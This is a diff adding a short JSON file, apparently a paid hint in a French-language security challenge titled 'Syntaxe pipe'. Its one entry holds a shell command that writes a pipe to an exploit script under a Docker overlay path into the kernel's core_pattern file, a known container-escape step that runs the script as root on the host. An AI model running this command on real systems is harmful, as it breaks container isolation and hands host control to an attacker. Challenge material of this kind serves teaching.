@@ -1,0 +1,7 @@
+[
+  {
+    "title": "Syntaxe pipe",
+    "cost": 25,
+    "content": "echo '|/var/lib/docker/overlay2/.../exploit.sh' > /proc/sys/kernel/core_pattern"
+  }
+]
